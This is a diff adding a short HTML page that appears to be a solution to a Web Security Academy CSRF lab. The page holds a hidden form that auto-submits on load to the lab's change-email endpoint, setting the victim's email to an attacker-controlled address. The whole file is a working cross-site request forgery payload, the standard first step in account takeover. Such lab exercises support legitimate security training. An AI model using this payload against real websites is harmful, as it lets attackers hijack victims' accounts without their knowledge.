@@ -1,0 +1,13 @@
+<html>
+  <body>
+    <form
+      action="http://0a54009d03d99a9d817c1bd2006c00c5.web-security-academy.net/my-account/change-email"
+      method="GET"
+    >
+      <input type="hidden" name="email" value="my@evil-email.net" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
